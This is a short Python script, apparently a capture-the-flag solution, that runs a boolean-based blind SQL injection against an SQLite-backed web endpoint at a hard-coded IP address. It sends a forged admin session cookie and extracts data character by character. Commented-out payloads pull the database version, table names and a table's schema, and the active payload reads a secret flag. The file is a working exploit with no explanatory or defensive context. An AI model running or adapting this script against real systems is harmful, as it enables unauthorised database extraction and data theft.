from wsgiref import headers
import requests
import time
import threading

def go():
    url = "http://1.14.71.254:28396/query"
    headers = {
        "cookie": "session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YlKv0Q.KBW9WanwIEka0ikKG4wYvGR0CqQ"
    }
    flag = ''
    for i in range(1,50):
        for j in range(32, 126):
            data = {
                # 爆出数据库版本
                #"id": "-1 or (case when(substr(sqlite_version()," + str(i) + ",1)='" + str(chr(j)) + "') then 1=1 else 1=2 end)--"
                # 爆出表名 user,flag
                #"id": "-1 or (case when(substr((select group_concat(tbl_name) from sqlite_master)," + str(i) + ",1)='" + str(chr(j)) + "') then 1=1 else 1=2 end)--"
                # 爆列名 
                #"id": "-1 or (case when(substr((select sql from sqlite_master where name = 'flag' and type='table')," + str(i) + ",1)='" + str(chr(j)) + "') then 1=1 else 1=2 end)--"
                # 爆数据
                "id": "-1 or (case when(substr((select flag from flag)," + str(i) + ",1)='" + str(chr(j)) + "') then 1=1 else 1=2 end)--"
            }
            resp = requests.post(url=url, data=data, headers=headers)
            if 'exist' in resp.text:
                flag += str(chr(j))
                print(flag)
                break
            if j == 125:
                print("亲，已经到底了----------")
                

if __name__ == '__main__':
    t = threading.Thread(target=go)
    t.start()